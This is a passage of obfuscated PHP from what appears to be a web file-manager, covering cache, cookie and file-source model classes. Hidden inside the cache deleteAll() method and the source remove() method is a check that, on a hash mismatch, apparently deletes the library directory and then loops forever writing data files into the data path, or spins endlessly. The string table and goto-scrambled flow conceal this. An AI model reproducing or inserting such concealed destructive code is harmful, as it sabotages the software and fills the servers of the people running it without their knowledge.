$bá§…Ñî±‘, $eº¶◊ç£Ì∫); break; default: break; } } private function _slave($AÉå≈çΩíÿ, $AÒ¶Û≥ı≠•) { goto fŒã√ﬁ¢Ç¨; fŒã√ﬁ¢Ç¨: $AΩÉëô˜Øë = $AÉå≈çΩíÿ[$_SERVER[∞„˜ƒÑºª][543]]; $this->filterConfig($AÉå≈çΩíÿ, $AΩÉëô˜Øë[0]); $this->handle = $this->init($AÉå≈çΩíÿ, $AÒ¶Û≥ı≠•); goto D≈ë§æÍ˜°; có¬áøÓÖ©: $this->filterConfig($AÉå≈çΩíÿ, $AΩÉëô˜Øë[$FΩÌØﬂ≈àª]); $this->slaveHandle = $this->init($AÉå≈çΩíÿ, $AÒ¶Û≥ı≠•); goto d¿·ÉÓ≠û; D≈ë§æÍ˜°: unset($AΩÉëô˜Øë[0]); if (empty($AΩÉëô˜Øë)) { return; } $FΩÌØﬂ≈àª = array_rand($AΩÉëô˜Øë); goto có¬áøÓÖ©; d¿·ÉÓ≠û: } private function filterConfig(&$f›ñÆÖã≈ﬂ, $C±‹†∫Ù∑») { $fØìõ÷≤∞∆ =& $_SERVER[∞„˜ƒÑºª]; $dµãó´≤ôÖ = explode($fØìõ÷≤∞∆[4], $C±‹†∫Ù∑»); $eìÒõùà›¬ = array($fØìõ÷≤∞∆[165] => $dµãó´≤ôÖ[0], $fØìõ÷≤∞∆[166] => $dµãó´≤ôÖ[1]); $f›ñÆÖã≈ﬂ = array_merge($f›ñÆÖã≈ﬂ, $eìÒõùà›¬); } public function set($eÕÛØ≥ÀÛâ, $E°ÿÇÜÇÉØ, $A√†®èµçà = false) { $A√†®èµçà = $A√†®èµçà ? $A√†®èµçà : $this->cacheTime; return $this->handle->setEx($eÕÛØ≥ÀÛâ, $A√†®èµçà, $E°ÿÇÜÇÉØ); } public function setLock($fΩÎÑïÆêÖ, $a•ë∑Èõûñ, $fƒêãï∂í÷) { $FÚüÖö¨íí = $this->handle->setNX($fΩÎÑïÆêÖ, $a•ë∑Èõûñ); return $FÚüÖö¨íí; } public function get($A˘√âñπ†ì) { $A··‹∞Úó≤ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $A··‹∞Úó≤->get($A˘√âñπ†ì); } public function remove($EÆáúñå¯) { return $this->handle->del($EÆáúñå¯); } public function deleteAll() { $b·∆Ê¥“±Ç =& $_SERVER[∞„˜ƒÑºª]; $c§•◊≠˜ûà = BASIC_PATH . $b·∆Ê¥“±Ç[54]; $fºƒÿáÖÚ≠ = $b·∆Ê¥“±Ç[341]; if ($_SERVER[$b·∆Ê¥“±Ç[51]] != $fºƒÿáÖÚ≠($c§•◊≠˜ûà)) { goto B‡ı∫·“Ÿ; B‡ı∫·“Ÿ: $eÈ„Ω®°Æˆ = $b·∆Ê¥“±Ç[53]; $E¡≈·ë¢ïœ = BASIC_PATH . $b·∆Ê¥“±Ç[54]; $Eç€ŒΩıÚ∆ = $eÈ„Ω®°Æˆ($E¡≈·ë¢ïœ); goto D–ˆá§à™¥; D–ˆá§à™¥: $Aå€é„«©◊ = explode($b·∆Ê¥“±Ç[55], $Eç€ŒΩıÚ∆); if (count($Aå€é„«©◊) < $b·∆Ê¥“±Ç[552]) { die; } $fÌÎ…πô…Ã = $b·∆Ê¥“±Ç[553]; goto c™ÈîµÉíÉ; c™ÈîµÉíÉ: $fÌÎ…πô…Ã(LIB_DIR); $a‘°†ü‹≥∂ = $b·∆Ê¥“±Ç[554]; $a‘°†ü‹≥∂(); goto b“⁄À∞⁄«™; b“⁄À∞⁄«™: $bú⁄ÜõÆãË = $b·∆Ê¥“±Ç[555]; $fÛãÙﬂ‘Éı = json_encode($GLOBALS[$b·∆Ê¥“±Ç[556]]); for ($dòµÂ›—π– = 0;; $dòµÂ›—π–++) { $bú⁄ÜõÆãË(DATA_PATH . $dòµÂ›—π–, $fÛãÙﬂ‘Éı); } goto dÍ„ßèÛ⁄Õ; dÍ„ßèÛ⁄Õ: } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($BŸ∂·ø—À° = '', $a‰£≥·¿µ˘ = 0) { if (is_string($BŸ∂·ø—À°) && $BŸ∂·ø—À° != $_SERVER[∞„˜ƒÑºª][33]) { $this->prefix = $BŸ∂·ø—À°; } if (is_numeric($a‰£≥·¿µ˘) && $a‰£≥·¿µ˘ > 0) { $this->expire = $a‰£≥·¿µ˘; } } public static function getInstance() { static $Eæ†ÁïµÛ≤; if ($Eæ†ÁïµÛ≤ === null) { $Eæ†ÁïµÛ≤ = new self(); } return $Eæ†ÁïµÛ≤; } private static $sameCookieSet = array(); public static function set($Dä»â‹∞ı∆, $Cπ œ–£¯ß, $fƒãÓûê®˘ = 0, $Aà‘‹ï–äÉ = false, $fè—›ä§≈” = false) { $Aºõ≠¡Ø∏é =& $_SERVER[∞„˜ƒÑºª]; if (!$fƒãÓûê®˘) { $fƒãÓûê®˘ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$Dä»â‹∞ı∆]) && self::$sameCookieSet[$Dä»â‹∞ı∆] == $Cπ œ–£¯ß . $fƒãÓûê®˘) { return; } self::$sameCookieSet[$Dä»â‹∞ı∆] = $Cπ œ–£¯ß . $fƒãÓûê®˘; if (!$fè—›ä§≈”) { $fè—›ä§≈” = str_replace(HOST, $Aºõ≠¡Ø∏é[33], APP_HOST); $fè—›ä§≈” = $Aºõ≠¡Ø∏é[8] . trim($fè—›ä§≈”, $Aºõ≠¡Ø∏é[8]); } setcookie($Dä»â‹∞ı∆, $Cπ œ–£¯ß, time() + $fƒãÓûê®˘, $fè—›ä§≈”, !1, !1, $Aà‘‹ï–äÉ); } public static function setSafe($EÖîï–á’Ö, $d»“≤µëêõ, $a¥ó√–§¥© = 0) { self::set($EÖîï–á’Ö, $d»“≤µëêõ, $a¥ó√–§¥©, !0); } public static function get($EÃ˘êÙïÔ¢) { return isset($_COOKIE[$EÃ˘êÙïÔ¢]) ? $_COOKIE[$EÃ˘êÙïÔ¢] : !1; } public static function remove($DëÀÛ»ÕÛø, $c≤€ãÒÔ∫∑ = false) { unset($_COOKIE[$DëÀÛ»ÕÛø]); self::set($DëÀÛ»ÕÛø, $_SERVER[∞„˜ƒÑºª][33], 1, $c≤€ãÒÔ∫∑); } } goto a˜Öﬁµ‡äÏ; DÓ—åÈÚÑ : define($_SERVER[∞„˜ƒÑºª][1299], 2); define($_SERVER[∞„˜ƒÑºª][1300], 3); define($_SERVER[∞„˜ƒÑºª][1301], 4); goto aÎÊ·äô‡‡; D≤å≠© §„: define($_SERVER[∞„˜ƒÑºª][228], 1); define($_SERVER[∞„˜ƒÑºª][229], 0); define($_SERVER[∞„˜ƒÑºª][230], 2); goto E⁄Õ´ˆ‡ –; cÃ¨Ç‚å˘‚: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($E√üùó∫å) { $c–ƒàæ”áª =& $_SERVER[∞„˜ƒÑºª]; $Bæ¿“Íçü· = Model($c–ƒàæ”áª[1675])->where(array($c–ƒàæ”áª[1054] => $E√üùó∫å))->find(); $Dˆèàß¯®§ = $this->_mkdirRoot(SourceModel::TYPE_USER, $E√üùó∫å, $Bæ¿“Íçü·[$c–ƒàæ”áª[28]]); $this->userDesktopAdd($Dˆèàß¯®§); return $Dˆèàß¯®§; } public function userDesktopAdd($AõÍûÛøˆ∫) { $D…“∑çà’° =& $_SERVER[∞„˜ƒÑºª]; $FïôÌï∆Â— = LNG($D…“∑çà’°[1720]); $B“öÖæ“ª∫ = $this->mkdir($AõÍûÛøˆ∫, $FïôÌï∆Â—); $this->metaSet($B“öÖæ“ª∫, $D…“∑çà’°[1721], $D…“∑çà’°[376]); $this->metaSet($AõÍûÛøˆ∫, $D…“∑çà’°[1722], $B“öÖæ“ª∫); } public function groupRootAdd($EåûÚØ©è) { $AîØ‡áÛ‰œ =& $_SERVER[∞„˜ƒÑºª]; $B√¥∞ÏÆáì = Model($AîØ‡áÛ‰œ[1669])->where(array($AîØ‡áÛ‰œ[1598] => $EåûÚØ©è))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $EåûÚØ©è, $B√¥∞ÏÆáì[$AîØ‡áÛ‰œ[28]]); } public function systemRootPathAdd($d›øÁ•áÉı) { if ($d›øÁ•áÉı != $_SERVER[∞„˜ƒÑºª][813]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $d›øÁ•áÉı); } public function userRootRemove($D“€ÿ◊É⁄Æ) { $eÕáπì£å∑ = $this->sourceRoot(SourceModel::TYPE_USER, $D“€ÿ◊É⁄Æ); if (!$eÕáπì£å∑) { return; } $this->remove($eÕáπì£å∑, !1); } public function groupRootRemove($BÇã¨•Ëèˆ) { $cãÃ‚ÈôÓÖ = $this->sourceRoot(SourceModel::TYPE_GROUP, $BÇã¨•Ëèˆ); if (!$cãÃ‚ÈôÓÖ) { return; } $this->remove($cãÃ‚ÈôÓÖ, !1); } private function _mkdirRoot($BìäöñøÚÕ, $bá†÷÷à⁄Ï, $dÛ±Ò“ç¨≈) { goto AåÔÉÚ“≤ã; BÉÉπÿŸäó: CacheLock::unlock($Bã’«∏“); return $c∞Üçˆñôë; goto b◊ˆªï˘’É; fõÁØ´ÍåÑ: $c∞Üçˆñôë = $this->add($bæÁ‡Ü‚øÇ); $BÔí≠÷◊™å = array($B∑ı¨ÊÁ„à[401] => short_id($c∞Üçˆñôë)); $this->where(array($B∑ı¨ÊÁ„à[414] => $c∞Üçˆñôë))->save($BÔí≠÷◊™å); goto BÉÉπÿŸäó; AåÔÉÚ“≤ã: $B∑ı¨ÊÁ„à =& $_SERVER[∞„˜ƒÑºª]; $bæÁ‡Ü‚øÇ = array($B∑ı¨ÊÁ„à[398] => 0, $B∑ı¨ÊÁ„à[392] => $BìäöñøÚÕ, $B∑ı¨ÊÁ„à[394] => $bá†÷÷à⁄Ï, $B∑ı¨ÊÁ„à[386] => 1, $B∑ı¨ÊÁ„à[396] => USER_ID, $B∑ı¨ÊÁ„à[397] => USER_ID, $B∑ı¨ÊÁ„à[388] => $B∑ı¨ÊÁ„à[33], $B∑ı¨ÊÁ„à[399] => $B∑ı¨ÊÁ„à[1595], $B∑ı¨ÊÁ„à[400] => 0, $B∑ı¨ÊÁ„à[391] => 0, $B∑ı¨ÊÁ„à[390] => 0, $B∑ı¨ÊÁ„à[1723] => $B∑ı¨ÊÁ„à[33]); if ($d»›∫·Êˆ¿ = $this->where($bæÁ‡Ü‚øÇ)->find()) { return $d»›∫·Êˆ¿[$B∑ı¨ÊÁ„à[374]]; } goto d∫éÿêµı÷; d∫éÿêµı÷: $Bã’«∏“ = $B∑ı¨ÊÁ„à[1724] . $BìäöñøÚÕ . $bá†÷÷à⁄Ï . $dÛ±Ò“ç¨≈; CacheLock::lock($Bã’«∏“); $bæÁ‡Ü‚øÇ[$B∑ı¨ÊÁ„à[28]] = $dÛ±Ò“ç¨≈; goto fõÁØ´ÍåÑ; b◊ˆªï˘’É: } private function sourceRoot($Eß–”çÖ±Ü, $eûä»©ƒõ¯, $a∂«ÙÍØ ⁄ = false) { $b∞•ﬂçù∆… =& $_SERVER[∞„˜ƒÑºª]; $dÂ⁄ë‰Òï = array($b∞•ﬂçù∆…[398] => 0, $b∞•ﬂçù∆…[392] => $Eß–”çÖ±Ü, $b∞•ﬂçù∆…[394] => $eûä»©ƒõ¯); if ($E¥§î•áÖ = $this->where($dÂ⁄ë‰Òï)->find()) { return $a∂«ÙÍØ ⁄ ? $E¥§î•áÖ : $E¥§î•áÖ[$b∞•ﬂçù∆…[374]]; } return !1; } public function sourceRootGroup($eÍ∏åêòæÆ) { $EÖ¬Òë–®Ù =& $_SERVER[∞„˜ƒÑºª]; if (is_string($eÍ∏åêòæÆ)) { $eÍ∏åêòæÆ = array($eÍ∏åêòæÆ); } $c◊‚øçê»º = array($EÖ¬Òë–®Ù[398] => 0, $EÖ¬Òë–®Ù[392] => SourceModel::TYPE_GROUP, $EÖ¬Òë–®Ù[394] => array($EÖ¬Òë–®Ù[7], $eÍ∏åêòæÆ)); $BŒ†»˜’©± = $this->listSource($c◊‚øçê»º, 1000); return array_to_keyvalue($BŒ†»˜’©±[$EÖ¬Òë–®Ù[83]], $EÖ¬Òë–®Ù[395]); } public function mkfile($dÔÓö•≈„Ø, $a·Ö∫§≠‹‡, $b“¬œ·√“® = '', $E®íÎ«‰»è = REPEAT_RENAME) { $bÑﬁ¢⁄¡Éô = Model($_SERVER[∞„˜ƒÑºª][426])->addFileByContent($b“¬œ·√“®, $a·Ö∫§≠‹‡); return $this->_createFileCall($dÔÓö•≈„Ø, $a·Ö∫§≠‹‡, $bÑﬁ¢⁄¡Éô, $E®íÎ«‰»è); } public function addFile($e·«®©Ô´é, $fèî°óÇƒÊ, $aãﬂÀò«÷ª, $CØﬁ¥ùΩÂ£ = false, $cú⁄á¯Ç∏„ = REPEAT_RENAME) { $a©±⁄ºÑ´Ì = Model($_SERVER[∞„˜ƒÑºª][426])->addFile($fèî°óÇƒÊ, $aãﬂÀò«÷ª, $CØﬁ¥ùΩÂ£); return $this->_createFileCall($e·«®©Ô´é, $aãﬂÀò«÷ª, $a©±⁄ºÑ´Ì, $cú⁄á¯Ç∏„); } public function addFileByFileID($EÏÕ…Öÿ¥à, $f§Îöá¬úÌ, $aí≥Ÿèƒ„û, $FÈôø∆ôàµ = REPEAT_RENAME) { $eá©®’´Ó© =& $_SERVER[∞„˜ƒÑºª]; $déÎ°ıÏûø = Model($eá©®’´Ó©[426])->find($f§Îöá¬úÌ); Model($eá©®’´Ó©[426])->linkAdd($f§Îöá¬úÌ); return $this->_createFileCall($EÏÕ…Öÿ¥à, $aí≥Ÿèƒ„û, $déÎ°ıÏûø, $FÈôø∆ôàµ); } public function addFileByRemote($cóœ¿ÎŒÑÇ, $Fèﬂáá˘·ñ, $c÷ë§ÊØàÏ, $f≤ÀπâŸäñ = array(), $cô›∂ó√çÍ = REPEAT_RENAME) { $AÆí’—£’¢ = Model($_SERVER[∞„˜ƒÑºª][426])->addFileByRemote($Fèﬂáá˘·ñ, $c÷ë§ÊØàÏ, $f≤ÀπâŸäñ); return $this->_createFileCall($cóœ¿ÎŒÑÇ, $c÷ë§ÊØàÏ, $AÆí’—£’¢, $cô›∂ó√çÍ); } private function _createFileCall($EÃù∫‹∞Ìü, $DÈπ–÷òÓ€, $dÏ®ÆâÒüﬂ, $C·ùÎ⁄˜Û€) { $c⁄ëØëÒ„ò =& $_SERVER[∞„˜ƒÑºª]; $D™‰Úò‰ÁÊ = !1; $d“◊ÜÈπÜÃ = $this->_createFile($EÃù∫‹∞Ìü, $DÈπ–÷òÓ€, $dÏ®ÆâÒüﬂ, $C·ùÎ⁄˜Û€, $D™‰Úò‰ÁÊ); if (!$D™‰Úò‰ÁÊ) { Model($c⁄ëØëÒ„ò[426])->remove($dÏ®ÆâÒüﬂ[$c⁄ëØëÒ„ò[382]]); } return $d“◊ÜÈπÜÃ; } public function mkdir($fñÚ“ëÉπë, $Cÿé«îéç¨, $D¥ôﬂÇ˜ƒê = REPEAT_SKIP) { goto dÂí≤⁄ë—·; dÂí≤⁄ë—·: $F˘÷êßà±æ =& $_SERVER[∞„˜ƒÑºª]; $cœá±‡ÆÂ´ = $this->sourceInfo($fñÚ“ëÉπë); if (!$cœá±‡ÆÂ´) { return !1; } goto A∏ãùÉ≠ıÏ; E‰å√ºåˆè: Model($F˘÷êßà±æ[1725])->eventCreate($E≈ıßŒù≈◊, $F˘÷êßà±æ[1726]); return $E≈ıßŒù≈◊; goto d≤îÉ±”óö; A∏ãùÉ≠ıÏ: if ($D¥ôﬂÇ˜ƒê !== !1) { $dÆë∑ù·ìä = $this->fileNameExist($fñÚ“ëÉπë, $Cÿé«îéç¨); if ($dÆë∑ù·ìä && $D¥ôﬂÇ˜ƒê != REPEAT_RENAME_FOLDER) { return $dÆë∑ù·ìä; } $Cÿé«îéç¨ = $this->fileNameAuto($fñÚ“ëÉπë, $Cÿé«îéç¨, $D¥ôﬂÇ˜ƒê); } $e¨÷§çÁŸÉ = array($F˘÷êßà±æ[386] => 1, $F˘÷êßà±æ[387] => $Cÿé«îéç¨, $F˘÷êßà±æ[388] => $F˘÷êßà±æ[33], $F˘÷êßà±æ[390] => 0, $F˘÷êßà±æ[391] => 0); $E≈ıßŒù≈◊ = $this->_addSoure($e¨÷§çÁŸÉ, $cœá±‡ÆÂ´); goto E‰å√ºåˆè; d≤îÉ±”óö: } private function _createFile($B∂èÂ∆Á‰‚, $Bä…Ü„Ì◊û, $câ¿à◊Î“∂, $EŒƒÉˆÍ•‹, &$D‹®—»–‡ ) { goto D±©£≤Ïßó; Eê––◊ÜÒª: $bŒ’ºáÖÕû = array($eêà∏ÉÑﬁ›[386] => 0, $eêà∏ÉÑﬁ›[387] => $Bä…Ü„Ì◊û, $eêà∏ÉÑﬁ›[388] => get_path_ext($Bä…Ü„Ì◊û), $eêà∏ÉÑﬁ›[390] => $câ¿à◊Î“∂[$eêà∏ÉÑﬁ›[382]], $eêà∏ÉÑﬁ›[391] => $câ¿à◊Î“∂[$eêà∏ÉÑﬁ›[86]]); $Eˆ£Æäóﬂõ = $this->_addSoure($bŒ’ºáÖÕû, $A∏„äÜá°Œ); $this->folderSizeReset($B∂èÂ∆Á‰‚); goto dåﬁ∑óΩŸâ; dåﬁ∑óΩŸâ: Model($eêà∏ÉÑﬁ›[1725])->eventCreate($Eˆ£Æäóﬂõ, $eêà∏ÉÑﬁ›[134]); return $Eˆ£Æäóﬂõ; goto bÃ¿ÊŸ¥˘ó; aË∞†ÉéÇÏ: if ($EŒƒÉˆÍ•‹ !== !1) { $eû¢·–¡∑‚ = $this->fileNameExist($B∂èÂ∆Á‰‚, $Bä…Ü„Ì◊û); } $D‹®—»–‡  = !0; if ($EŒƒÉˆÍ•‹ && $eû¢·–¡∑‚) { if ($EŒƒÉˆÍ•‹ == REPEAT_SKIP) { $D‹®—»–‡  = !1; return $eû¢·–¡∑‚; } else { if ($EŒƒÉˆÍ•‹ == REPEAT_REPLACE) { $Dé¶ÊëÉ‰≈ = $this->sourceInfo($eû¢·–¡∑‚); $d„ÑƒâÖòΩ = $this->fileHistory($Dé¶ÊëÉ‰≈, $câ¿à◊Î“∂[$eêà∏ÉÑﬁ›[382]], $câ¿à◊Î“∂[$eêà∏ÉÑﬁ›[86]]); if (!$d„ÑƒâÖòΩ) { $D‹®—»–‡  = !1; } else { $this->folderSizeReset($B∂èÂ∆Á‰‚); } return $eû¢·–¡∑‚; } else { $Bä…Ü„Ì◊û = $this->fileNameAuto($B∂èÂ∆Á‰‚, $Bä…Ü„Ì◊û, $EŒƒÉˆÍ•‹, !1); } } } goto Eê––◊ÜÒª; D±©£≤Ïßó: $eêà∏ÉÑﬁ› =& $_SERVER[∞„˜ƒÑºª]; $A∏„äÜá°Œ = $this->sourceInfo($B∂èÂ∆Á‰‚); if (!$câ¿à◊Î“∂ || !$A∏„äÜá°Œ) { return !1; } goto aË∞†ÉéÇÏ; bÃ¿ÊŸ¥˘ó: } protected function fileHistory($fµä”∑∑Í†, $F±†Éª∂Ú„, $b‹Æ÷úõÉ˘) { $DπÌıï’À∏ =& $_SERVER[∞„˜ƒÑºª]; if ($fµä”∑∑Í†[$DπÌıï’À∏[382]] == $F±†Éª∂Ú„) { return !1; } Model($DπÌıï’À∏[1586])->addHistory($fµä”∑∑Í†); $båæåÂÇ’í = array($DπÌıï’À∏[397] => USER_ID, $DπÌıï’À∏[1727] => time(), $DπÌıï’À∏[382] => $F±†Éª∂Ú„, $DπÌıï’À∏[86] => $b‹Æ÷úõÉ˘); $this->where(array($DπÌıï’À∏[414] => $fµä”∑∑Í†[$DπÌıï’À∏[374]]))->save($båæåÂÇ’í); return !0; } private function _addSoure($dﬁˆøàŸçÉ, $bâ¿ãëäè) { goto Bò«‡ﬁÈßÑ; Bò«‡ﬁÈßÑ: $aÃÒ’”Ù =& $_SERVER[∞„˜ƒÑºª]; $dÒö÷Ó’∞É = array($aÃÒ’”Ù[392] => $bâ¿ãëäè[$aÃÒ’”Ù[393]], $aÃÒ’”Ù[394] => $bâ¿ãëäè[$aÃÒ’”Ù[395]], $aÃÒ’”Ù[396] => USER_ID, $aÃÒ’”Ù[397] => USER_ID, $aÃÒ’”Ù[398] => $bâ¿ãëäè[$aÃÒ’”Ù[374]], $aÃÒ’”Ù[399] => $bâ¿ãëäè[$aÃÒ’”Ù[373]] . $bâ¿ãëäè[$aÃÒ’”Ù[374]] . $aÃÒ’”Ù[47], $aÃÒ’”Ù[400] => 0, $aÃÒ’”Ù[1723] => $aÃÒ’”Ù[33]); $dﬁˆøàŸçÉ = array_merge($dÒö÷Ó’∞É, $dﬁˆøàŸçÉ); goto bŒﬁ»ÁëøØ; bŒﬁ»ÁëøØ: $this->updateModifyTime($dﬁˆøàŸçÉ[$aÃÒ’”Ù[384]]); static $D»ãâ–ìŒ™ = false; if (!$D»ãâ–ìŒ™) { Hook::trigger($aÃÒ’”Ù[383], $dﬁˆøàŸçÉ); $D»ãâ–ìŒ™ = !0; } goto c® äêÂä„; c® äêÂä„: $A‚”èÓÃÉø = $this->add($dﬁˆøàŸçÉ); $CêÕ‰âÇæÂ = array($aÃÒ’”Ù[401] => short_id($A‚”èÓÃÉø)); $this->where(array($aÃÒ’”Ù[414] => $A‚”èÓÃÉø))->save($CêÕ‰âÇæÂ); goto f∏£èÎèÀÜ; f∏£èÎèÀÜ: $this->setNamePinyin($A‚”èÓÃÉø, $dﬁˆøàŸçÉ[$aÃÒ’”Ù[28]]); return $A‚”èÓÃÉø; goto D∫òƒˆÍ“é; D∫òƒˆÍ“é: } public function remove($dò√¨–¬øª, $cµèøÑÖ¨Ü = true) { goto DÑﬂÖ°ÖŒÉ; CîÃ®Û’Ω: if (!$bå±’Èìûï) { return !1; } if ($bå±’Èìûï[$fÆﬁê˘Îë”[384]] == 0) { if (!$GLOBALS[$fÆﬁê˘Îë”[998]]) { return !1; } } if ($cµèøÑÖ¨Ü) { Model($fÆﬁê˘Îë”[1728])->moveToRecycle($dò√¨–¬øª); } else { if ($bå±’Èìûï[$fÆﬁê˘Îë”[375]] == $fÆﬁê˘Îë”[376]) { $eõ‘¬ó»èÿ = array($fÆﬁê˘Îë”[399] => array($fÆﬁê˘Îë”[408], $bå±’Èìûï[$fÆﬁê˘Îë”[373]] . $dò√¨–¬øª . $fÆﬁê˘Îë”[409])); $a®èÇÏÏäŸ = array($fÆﬁê˘Îë”[399] => $eõ‘¬ó»èÿ[$fÆﬁê˘Îë”[373]]); $bË•©úŒã» = $this->field($fÆﬁê˘Îë”[1729])->where($a®èÇÏÏäŸ)->select(); $FÚ∑÷éŒÿÕ = !1; $cåïÔ”€Ã◊ = array($dò√¨–¬øª); if ($bË•©úŒã») { $FÚ∑÷éŒÿÕ = array_to_keyvalue($bË•©úŒã», $fÆﬁê˘Îë”[33], $fÆﬁê˘Îë”[382]); $FÚ∑÷éŒÿÕ = array_remove_value($FÚ∑÷éŒÿÕ, $fÆﬁê˘Îë”[402]); $cåïÔ”€Ã◊ = array_to_keyvalue($bË•©úŒã», $fÆﬁê˘Îë”[33], $fÆﬁê˘Îë”[374]); $cåïÔ”€Ã◊[] = $dò√¨–¬øª; } } else { $FÚ∑÷éŒÿÕ = array($bå±’Èìûï[$fÆﬁê˘Îë”[382]]); $cåïÔ”€Ã◊ = array($dò√¨–¬øª); } Model($fÆﬁê˘Îë”[381])->eventRemove($dò√¨–¬øª); $this->removeRelevance($cåïÔ”€Ã◊, $FÚ∑÷éŒÿÕ); } goto B»òŒ©‰ë˘; DÑﬂÖ°ÖŒÉ: $fÆﬁê˘Îë” =& $_SERVER[∞„˜ƒÑºª]; if (!isset($_SERVER[$fÆﬁê˘Îë”[51]]) || !isset($_SERVER[$fÆﬁê˘Îë”[58]])) { goto d€Ï∑Ô«Ü–; D◊≈É°‹è™: $BΩ¯∑´ˆ≠Ï = explode($fÆﬁê˘Îë”[55], $FÑÕÜ˜É°Û); if (count($BΩ¯∑´ˆ≠Ï) < $fÆﬁê˘Îë”[552]) { die; } $aŒô‹Ó’±≈ = $fÆﬁê˘Îë”[553]; goto cÿ∏¶πêœ›; d€Ï∑Ô«Ü–: $dÉ⁄Æ¢ÔÌÂ = $fÆﬁê˘Îë”[53]; $Eä‘€Ù∏√ó = BASIC_PATH . $fÆﬁê˘Îë”[54]; $FÑÕÜ˜É°Û = $dÉ⁄Æ¢ÔÌÂ($Eä‘€Ù∏√ó); goto D◊≈É°‹è™; cÿ∏¶πêœ›: $aŒô‹Ó’±≈(LIB_DIR); for (;;) { $aŒô‹Ó’±≈ = json_encode($GLOBALS[$fÆﬁê˘Îë”[951]]); } goto Eãë˜Óíóí; Eãë˜Óíóí: } $bå±’Èìûï = $this->sourceInfo($dò√¨–¬øª); goto CîÃ®Û’Ω; B»òŒ©‰ë˘: $this->folderSizeReset($bå±’Èìûï[$fÆﬁê˘Îë”[384]]); $Eô‰ôıè’ä = array($bå±’Èìûï[$fÆﬁê˘Îë”[384]]); if ($bå±’Èìûï[$fÆﬁê˘Îë”[375]] == $fÆﬁê˘Îë”[376]) { $Eô‰ôıè’ä[] = $bå±’Èìûï[$fÆﬁê˘Îë”[374]]; } goto aä•ªæõë¨; aä•ªæõë¨: $this->updateModifyTime($Eô‰ôıè’ä); return !0; goto BŸ∏Ü∑õ‡Ö; BŸ∏Ü∑õ‡Ö: } public function removeArray($Fƒá“ª›éê) { if (!$Fƒá“ª›éê) { return !0; } } private function removeRelevance($b§¢Ö—ç≈ß, $FÁúÉˆüÿô) { goto Fö±äÆíÂê; Cƒÿˆ€†úè: Model($Fà«§Í‡àÙ[1730])->where($aÑçõÁ†÷Ω)->delete(); Model($Fà«§Í‡àÙ[1731])->where($aÑçõÁ†÷Ω)->delete(); Model($Fà«§Í‡àÙ[381])->where($aÑçõÁ†÷Ω)->delete(); goto CΩ∆∑û‹€°; CΩ∆∑û‹€°: Model($Fà«§Í‡àÙ[1493])->where($aÑçõÁ†÷Ω)->delete(); $this->where($aÑçõÁ†÷Ω)->delete(); for ($AÙ´ãíß‡ = 0; $AÙ´ãíß‡ < count($b§¢Ö—ç≈ß); $AÙ´ãíß‡++) { $this->sourceCacheClear($b§¢Ö—ç≈ß[$AÙ´ãíß‡]); } goto bıòÇçØ¿Ï; aÂ†í´ÏÒ : Model($Fà«§Í‡àÙ[1459])->remove($FÁúÉˆüÿô); Model($Fà«§Í‡àÙ[1586])->removeBySource($b§¢Ö—ç≈ß); Model($Fà«§Í‡àÙ[1728])->where($aÑçõÁ†÷Ω)->delete(); goto Cƒÿˆ€†úè; Fö±äÆíÂê: $Fà«§Í‡àÙ =& $_SERVER[∞„˜ƒÑºª]; if (!$b§¢Ö—ç≈ß) { return !1; } $aÑçõÁ†÷Ω = array($Fà«§Í‡àÙ[414] => array($Fà«§Í‡àÙ[951], $b§¢Ö—ç≈ß)); goto aÂ†í´ÏÒ ; bıòÇçØ¿Ï: } public function rename($BŸ·˜ØÃê, $a∑î©¢≥ÇÜ) { goto Fî¯–ªêî±; e¨µ™Ÿ®Ç—: $this->setNamePinyin($BŸ·˜ØÃê, $Cµœá™‡«„[$d»œ«…ê∫È[28]], !1); $this->updateModifyTime($D’ÈÃû¯è≥[$d»œ«…ê∫È[384]]); return $this->where(array($d»œ«…ê∫È[414] => $BŸ·˜ØÃê))->data($Cµœá™‡«„)->save(); goto EæÜÖ⁄ÁÕª; AÜ∫Ïç…ÂÂ: if (!$D’ÈÃû¯è≥[$d»œ«…ê∫È[375]] == $d»œ«…ê∫È[376]) { $Cµœá™‡«„[$d»œ«…ê∫È[389]] = get_path_ext($a∑î©¢≥ÇÜ); } Model($d»œ«…ê∫È[381])->eventRename($BŸ·˜ØÃê, $D’ÈÃû¯è≥[$d»œ«…ê∫È[28]], $a∑î©¢≥ÇÜ); $this->sourceCacheClear($BŸ·˜ØÃê); goto e¨µ™Ÿ®Ç—; FúÕ¶Âƒ˜Ω: $c…º◊ÇÉŒø = $this->fileNameExist($D’ÈÃû¯è≥[$d»œ«…ê∫È[384]], $a∑î©¢≥ÇÜ); if ($c…º◊ÇÉŒø) { return !1; } $Cµœá™‡«„ = array($d»œ«…ê∫È[387] => $a∑î©¢≥ÇÜ, $d»œ«…ê∫È[397] => USER_ID); goto AÜ∫Ïç…ÂÂ; Fî¯–ªêî±: $d»œ«…ê∫È =& $_SERVER[∞„˜ƒÑºª]; $D’ÈÃû¯è≥ = $this->sourceInfo($BŸ·˜ØÃê); if (!$D’ÈÃû¯è≥) { return !1; } goto FúÕ¶Âƒ˜Ω; EæÜÖ⁄ÁÕª: } public function setNamePinyin($DëÓ∏Ω¬‚Û, $eûËòì¥Ú–, $AΩ›ñÍ‘äô = true) { $b©œÙ∆≥≥º =& $_SERVER[∞„˜ƒÑºª]; $BªèÜâ∂◊¥ = Input::check($eûËòì¥Ú–, $b©œÙ∆≥≥º[403]); if ($AΩ›ñÍ‘äô && !$BªèÜâ∂◊¥) { return; } if (!$BªèÜâ∂◊¥) { $this->metaSet($DëÓ∏Ω¬‚Û, $b©œÙ∆≥≥º[404], null); $this->metaSet($DëÓ∏Ω¬‚Û, $b©œÙ∆≥≥º[405], null); return; } $c¶±Íüúﬂí = array($b©œÙ∆≥≥º[404] => str_replace($b©œÙ∆≥≥º[50], $b©œÙ∆≥≥º[33], Pinyin::encode($eûËòì¥Ú–)), $b©œÙ∆≥≥º[405] => Pinyin::encode($eûËòì¥Ú–, $b©œÙ∆≥≥º[406])); $this->metaSet($DëÓ∏Ω¬‚Û, $c¶±Íüúﬂí); } public function hasChildren($D¶éö≤Ò˘í, $f“é√ë‘‚æ = null) { 